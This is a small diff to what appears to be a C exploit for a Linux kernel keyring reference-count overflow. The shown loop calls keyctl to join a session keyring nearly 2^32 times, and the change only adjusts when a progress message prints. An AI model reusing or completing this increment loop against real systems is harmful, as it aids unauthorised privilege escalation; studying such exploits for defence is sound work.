@@ -100,10 +100,12 @@ struct { long mtype;
 
 	puts("Increfing...");
     for (i = 1; i < 0xfffffffd; i++) {
+        if(i % 10000 == 0){
+	    puts("stay awake");
+	}
         if (i == (0xffffffff - l)) {
             l = l/2;
             sleep(5);
-            puts("stay awake");
         }
         if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
             perror("keyctl");
